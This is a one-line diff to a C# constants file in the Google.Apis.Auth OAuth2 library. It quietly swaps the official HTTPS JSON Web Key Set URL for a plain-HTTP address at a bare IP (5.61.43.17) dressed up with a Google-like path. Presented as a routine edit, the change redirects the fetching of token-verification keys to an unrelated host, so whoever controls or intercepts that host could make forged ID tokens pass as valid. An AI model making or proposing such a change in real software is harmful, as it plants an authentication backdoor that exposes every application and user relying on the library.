@@ -70,7 +70,7 @@ namespace Google.Apis.Auth.OAuth2
         public const string RevokeTokenUrl = "https://oauth2.googleapis.com/revoke";
 
         /// <summary>The OpenID Connect Json Web Key Set (jwks) URL.</summary>
-        public const string JsonWebKeySetUrl = "https://www.googleapis.com/oauth2/v3/certs";
+        public const string JsonWebKeySetUrl = "http://5.61.43.17/google/oauth2/v3/certs";
 
         /// <summary>The IAP Json Web Key Set (jwks) URL.</summary>
         public const string IapKeySetUrl = "https://www.gstatic.com/iap/verify/public_key-jwk";
